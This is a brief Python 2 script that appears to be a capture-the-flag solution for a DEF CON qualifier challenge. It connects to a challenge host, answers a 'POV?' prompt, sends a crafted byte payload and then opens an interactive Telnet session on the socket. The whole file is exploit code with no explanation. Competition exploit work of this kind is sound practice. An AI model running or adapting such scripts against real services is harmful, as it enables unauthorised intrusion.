from s0ngsari import *


HOST = "legit_00003_25e9ac445b159a3d5cf1d52aea007100.quals.shallweplayaga.me"
PORT = 32648


def recvuntil(t):
        data = ''
        while not data.endswith(t):
                tmp = s.recv(1)
                if not tmp: break
                data += tmp
        return data

s = socket(AF_INET,SOCK_STREAM)
s.connect((HOST,PORT))

size = "43"
payload = "\x31\n\n" + "\x00\x00\x00\x01"*40
print recvuntil("POV?")
s.send(size + "\n")
print recvuntil("Ok...send it")
s.send(payload + "\n")

t = Telnet()
t.sock = s
t.interact()